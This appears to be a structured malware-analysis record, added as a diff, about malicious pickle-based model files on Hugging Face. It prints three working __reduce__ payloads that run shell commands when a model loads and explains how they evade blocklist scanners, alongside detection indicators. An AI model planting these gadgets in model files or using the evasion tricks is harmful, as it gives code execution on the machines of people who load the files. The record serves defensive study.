@@ -1,0 +1,121 @@
+{
+  "package_info": {
+    "package_name": "gpt2-nm (example: dortucx/gpt2-nm, nogoodfastai2)",
+    "package_manager": "Hugging Face Model Hub",
+    "package_versions": "N/A (model files: pytorch_model.bin, model.pkl)",
+    "why_malicious": "The model files contain serialized Python objects (pickles) that execute arbitrary code upon deserialization (e.g., via torch.load), enabling remote code execution. The malicious payloads are crafted to bypass static blocklist-based scanners (PickleScan, ModelScan) by leveraging less common Python gadgets and protocol optimizations, allowing attackers to execute OS commands on the victim's machine during model loading."
+  },
+  "malicious_snippets": [
+    {
+      "snippet_id": "snippet_1",
+      "execution_context": {
+        "trigger": "At model load time (torch.load, pickle.load)",
+        "file_location": "pytorch_model.bin / model.pkl (malicious pickle file)",
+        "required_permissions": [
+          "filesystem",
+          "os command execution"
+        ]
+      },
+      "code_snippet": "class BadInnerPickle:\n    def __reduce__(self):\n        cse = asyncio.create_subprocess_shell\n        return cse, ('whoami',)\n\nclass BadOuterPickle:\n    def __reduce__(self):\n        return asyncio.run, (BadInnerPickle(),)",
+      "code_language": "python",
+      "code_behavior": "At model load time, the deserialization process triggers the __reduce__ method, which uses asyncio to spawn a shell and execute the 'whoami' command, resulting in arbitrary OS command execution.",
+      "malice_analysis": {
+        "why_suspicious": "Deserialization of a model file should not result in shell command execution. The use of __reduce__ to trigger subprocesses via asyncio.create_subprocess_shell is a classic code execution gadget that can bypass static analysis tools.",
+        "violated_expectations": "Normal model files should only contain tensor data and model weights, not executable code or OS command invocations during deserialization.",
+        "similar_legitimate_use": "Rarely, advanced debugging or custom serialization might use __reduce__, but never for arbitrary shell execution or subprocess creation.",
+        "key_indicators": [
+          "Custom __reduce__ method returning asyncio.create_subprocess_shell",
+          "Execution of shell commands during deserialization",
+          "Use of asyncio.run to trigger code execution in pickle context"
+        ]
+      }
+    },
+    {
+      "snippet_id": "snippet_2",
+      "execution_context": {
+        "trigger": "At model load time (torch.load, pickle.load)",
+        "file_location": "pytorch_model.bin / model.pkl (malicious pickle file)",
+        "required_permissions": [
+          "filesystem",
+          "os command execution"
+        ]
+      },
+      "code_snippet": "class BadPickle:\n    def __reduce__(self):\n        cmd = 'import os; os.system(\"whoami\")'\n        return exec, (cmd,)\n\nclass TorchedPickle:\n    def __reduce__(self):\n        import io\n        badpicklebytes = io.BytesIO()\n        torch.save(BadPickle(), badpicklebytes)\n        badpicklebytes.seek(0)\n        return torch.load, (badpicklebytes,)",
+      "code_language": "python",
+      "code_behavior": "At model load time, the deserialization process triggers a nested pickle payload that executes arbitrary Python code ('whoami' via os.system) using exec, and leverages torch.load to deserialize further malicious payloads, resulting in OS command execution.",
+      "malice_analysis": {
+        "why_suspicious": "The use of exec and os.system in a model's pickle file is a direct code execution vector. Nesting torch.load within __reduce__ is a sophisticated evasion technique that can bypass static blocklists by hiding the actual payload in a secondary deserialization step.",
+        "violated_expectations": "Model deserialization should not execute arbitrary code or system commands, nor should it perform nested deserialization of in-memory pickles.",
+        "similar_legitimate_use": "No legitimate use for this pattern in standard model files; nested torch.load within __reduce__ is highly abnormal.",
+        "key_indicators": [
+          "Custom __reduce__ returning exec and os.system",
+          "Nested torch.load calls within __reduce__",
+          "In-memory pickle streams used for code execution"
+        ]
+      }
+    },
+    {
+      "snippet_id": "snippet_3",
+      "execution_context": {
+        "trigger": "At model load time (torch.load, pickle.load)",
+        "file_location": "model.pkl (malicious pickle file)",
+        "required_permissions": [
+          "filesystem",
+          "os command execution"
+        ]
+      },
+      "code_snippet": "class BdbPayload:\n    def __reduce__(self):\n        import bdb\n        return bdb.Bdb.run, ('os.system(\"whoami\")',)",
+      "code_language": "python",
+      "code_behavior": "At model load time, the deserialization process uses the bdb.Bdb.run method to execute arbitrary code ('os.system(\"whoami\")'), bypassing blocklists that only check for exec/eval, resulting in OS command execution.",
+      "malice_analysis": {
+        "why_suspicious": "Abuse of the Python debugger (bdb.Bdb.run) for code execution is a known gadget attack, especially when used in a pickle context to evade detection by static analysis tools.",
+        "violated_expectations": "Model files should not invoke debugger methods or execute arbitrary code during deserialization.",
+        "similar_legitimate_use": "No legitimate use in production models; use of bdb.Bdb.run in this context is highly suspicious.",
+        "key_indicators": [
+          "Use of bdb.Bdb.run in pickle __reduce__",
+          "Indirect code execution via debugger methods",
+          "References to os.system in deserialization context"
+        ]
+      }
+    }
+  ],
+  "attack_chain": [
+    {
+      "step": 1,
+      "action": "User downloads and loads a malicious model file (pytorch_model.bin or model.pkl) from Hugging Face using torch.load or pickle.load.",
+      "implemented_by": [
+        "snippet_1",
+        "snippet_2",
+        "snippet_3"
+      ],
+      "leads_to": "Deserialization triggers execution of arbitrary Python code embedded in the pickle payload."
+    },
+    {
+      "step": 2,
+      "action": "Malicious __reduce__ methods execute OS commands (e.g., 'whoami') or spawn subprocesses, potentially allowing full remote code execution.",
+      "implemented_by": [
+        "snippet_1",
+        "snippet_2",
+        "snippet_3"
+      ],
+      "leads_to": "Attacker gains code execution on the victim's machine, enabling further compromise."
+    }
+  ],
+  "detection_knowledge": {
+    "behavioral_signatures": [
+      "Model deserialization (torch.load, pickle.load) triggers OS command execution",
+      "Presence of custom __reduce__ methods returning exec, os.system, asyncio.create_subprocess_shell, bdb.Bdb.run, or torch.load",
+      "Nested deserialization (torch.load within __reduce__)",
+      "Unexpected subprocess or shell command execution during model loading"
+    ],
+    "file_indicators": [
+      "model.pkl, pytorch_model.bin containing non-tensor, non-weight objects",
+      "Pickle files with references to bdb.Bdb, exec, os.system, asyncio, or torch.load",
+      "Serialized objects with custom __reduce__ methods"
+    ],
+    "network_indicators": [
+      "Not directly applicable unless payload exfiltrates data or connects to C2; monitor for unexpected outbound connections after model load"
+    ],
+    "how_to_detect": "Statically analyze pickle and torch model files for custom __reduce__ methods, references to dangerous functions (exec, os.system, asyncio.create_subprocess_shell, bdb.Bdb.run, torch.load), and nested deserialization. Monitor runtime for unexpected subprocess or shell command execution during model loading. Prefer allow-listing safe deserialization targets and avoid loading untrusted pickle-based models. Use automated tools to scan for non-tensor objects and suspicious references in model files."
+  }
+}
